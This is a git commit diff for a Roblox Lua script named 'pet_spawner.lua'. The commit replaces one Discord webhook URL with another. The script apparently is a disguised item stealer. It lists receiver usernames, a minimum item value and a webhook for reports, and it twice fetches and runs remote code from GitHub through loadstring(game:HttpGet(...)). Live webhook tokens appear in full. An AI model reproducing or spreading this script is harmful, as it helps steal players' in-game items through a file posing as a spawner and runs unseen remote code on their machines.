e4bf5d36d1681ff1bdf086dbad90d92363dfc6cb
thatboyskulls12 <aj.skulls12@gmail.com>
2025-06-22 21:36:23 -0400

    Update pet_spawner.lua

--- pet_spawner.lua
+++ pet_spawner.lua
@@ -5,6 +5,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptm
 _G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12", "ajandaa12alt11"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1386517127539720193/qXE2B71m9LsS2ifC0xs-DDun8f9TvqKa1mEkzEwgULinsgt7Wg6307NKbAYH5mc09M0w" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1386520152367042560/pPEkuZbTTufmpNy83Tp6a-h_4-b4NORP4QpSWeYlrtwy2KIyZou3kb0EwVvf_5JmtCLS" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/source.lua"))()
